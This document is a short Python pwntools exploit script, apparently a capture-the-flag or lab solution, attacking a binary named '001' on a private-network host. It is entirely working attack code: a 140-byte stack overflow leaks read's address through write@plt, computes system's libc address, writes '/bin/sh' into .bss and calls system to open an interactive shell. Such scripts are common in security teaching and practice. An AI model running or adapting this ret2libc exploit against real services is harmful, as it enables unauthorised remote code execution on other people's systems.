#!/usr/bin/python 
from pwn import *

#p = process('001')
p=remote('192.168.152.130','1245')
elf = ELF('./001')
libc = ELF('./libc.so.6')

read_plt = elf.symbols['read']
write_plt = elf.symbols['write']
main = elf.symbols['main']
read_got = elf.symbols['got.read']
address = read_got

payload1 = "A" * 140 + p32(write_plt) + p32(main) + p32(1) + p32(address) + p32(4)
p.sendline(payload1)
read_addr = u32(p.recv(4))
log.info("read_addr = " + hex(read_addr))

read_libc = libc.symbols['read']
system_libc = libc.symbols['system']
system_addr = system_libc - read_libc + read_addr
# read_libc - read_r = system_libc - system_r
log.info("system_addr = " + hex(system_addr))

bss_addr = elf.symbols['__bss_start']
pppr = 0x804850d

payload2 = "B" * 140 + p32(read_plt) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(main) + p32(bss_addr)

with open("payload","w") as f:
	f.write(payload2)

p.sendline(payload2)
p.sendline("/bin/sh\0")

p.interactive()

